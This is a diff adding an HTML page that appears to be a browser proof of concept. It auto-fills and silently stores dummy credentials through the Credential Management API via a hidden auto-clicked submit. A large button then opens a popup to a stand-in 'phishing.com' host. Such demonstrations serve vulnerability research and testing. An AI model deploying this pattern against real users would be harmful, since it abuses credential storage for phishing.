@@ -1,0 +1,52 @@
+<form id="signup" method="POST">
+  <input type="email" name="username" id="usernamefield" autocomplete="username email" >
+  <input type="password" name="pwd" id="passwdfield" autocomplete="new-password"/>
+  <input type="submit" id="submitfield" value="Submit" hidden>
+</form>
+
+<script>
+  let win_obj;
+
+  function storepwd() 
+  {
+    let uname = document.getElementById("usernamefield");
+    let pwd = document.getElementById("passwdfield");
+    let f = document.querySelector('#signup');
+
+    uname.value = "abc@def";
+    pwd.value = "11111111";
+
+    f.addEventListener("submit", 
+    async (eve) => {
+      eve.preventDefault();
+      let c = new PasswordCredential(eve.target);
+
+      return navigator.credentials.store(c);
+    });
+
+    setTimeout(() => 
+    {
+      document.getElementById("submitfield").click();
+    }, 100);
+  }
+
+  function clickme() 
+  {
+    window.addEventListener("message", 
+    () => {
+      setTimeout(() => 
+      {
+        win_obj.close();
+      }, 5000);
+    });
+
+    win_obj = window.open("http://phishing.com:8000/child.html");
+  }
+
+  window.onload = storepwd;
+</script>
+
+<button onclick="clickme()" style="
+    font-size: 360px;
+    line-height: 1.5;
+">Click Me</button>
